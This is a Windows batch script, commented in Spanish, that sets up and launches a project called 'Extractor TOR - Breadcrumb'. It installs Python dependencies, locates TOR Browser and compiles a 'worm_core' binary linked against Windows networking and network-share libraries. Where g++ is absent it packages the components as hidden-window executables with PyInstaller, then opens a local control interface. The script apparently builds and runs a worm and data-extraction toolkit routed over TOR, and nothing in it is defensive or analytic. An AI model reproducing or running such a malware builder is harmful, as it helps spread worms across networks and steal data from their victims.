@echo off
setlocal EnableDelayedExpansion
title Extractor TOR - Inicio
color 0A

set "ROOT=%~dp0"
cd /d "%ROOT%"

echo.
echo  ============================================================
echo    EXTRACTOR TOR - Breadcrumb
echo    Iniciando el proyecto completo...
echo  ============================================================
echo.

REM --- 1. Python ---
where python >nul 2>nul
if errorlevel 1 (
    echo [!] Python no encontrado. Instala desde python.org con "Add to PATH".
    pause
    exit /b 1
)

REM --- 2. Dependencias Python ---
echo [*] Verificando dependencias...
set "NEED="
for %%m in (requests socks wmi pyinstaller) do (
    python -c "import %%m" >nul 2>nul
    if errorlevel 1 set "NEED=!NEED! %%m"
)
if not "!NEED!"=="" (
    echo [*] Instalando:!NEED!
    python -m pip install --upgrade pip
    python -m pip install !NEED!
    python -m pip install PySocks
)

REM --- 3. Buscar TOR ---
if not exist tor_path.txt (
    echo [*] Buscando TOR Browser...
    python -c "from tor_locator import find_tor_install; p=find_tor_install(); open('tor_path.txt','w').write(p or ''); print('[+] TOR: ' + (p or 'NO ENCONTRADO'))"
)
if exist tor_path.txt (
    set /p TORROOT=<tor_path.txt
    if "!TORROOT!"=="" (
        echo [!] TOR no encontrado automaticamente.
        set /p TORROOT="  Ruta de TOR Browser: "
        echo !TORROOT!> tor_path.txt
    )
)

REM --- 4. Compilar binarios si faltan ---
if not exist worm_core.exe (
    if exist worm_core.cpp (
        echo [*] Compilando worm_core.exe...
        where g++ >nul 2>nul
        if not errorlevel 1 (
            g++ -std=c++20 -O2 -static -mconsole -pthread worm_core.cpp -o worm_core.exe -lws2_32 -lmpr
        ) else (
            python -m PyInstaller --onefile --noconsole --distpath . --workpath build --specpath . worm_core.py >nul 2>&1
        )
    )
)
if not exist tor_wrapper.exe (
    if exist tor_wrapper.cpp (
        echo [*] Compilando tor_wrapper.exe...
        where g++ >nul 2>nul
        if not errorlevel 1 (
            g++ -std=c++20 -O2 -static -municode -pthread tor_wrapper.cpp -o tor_wrapper.exe -lws2_32
        ) else (
            python -m PyInstaller --onefile --noconsole --distpath . --workpath build --specpath . tor_wrapper.py >nul 2>&1
        )
    )
)

REM --- 5. Lanzar interfaz ---
echo.
echo [*] Abriendo interfaz visual...
start "" python extractor_gui.py

echo.
echo ============================================================
echo  Todo listo. La interfaz se abrira en tu navegador.
echo  Si no se abre automaticamente, visita: http://localhost:8080
echo ============================================================
echo.
pause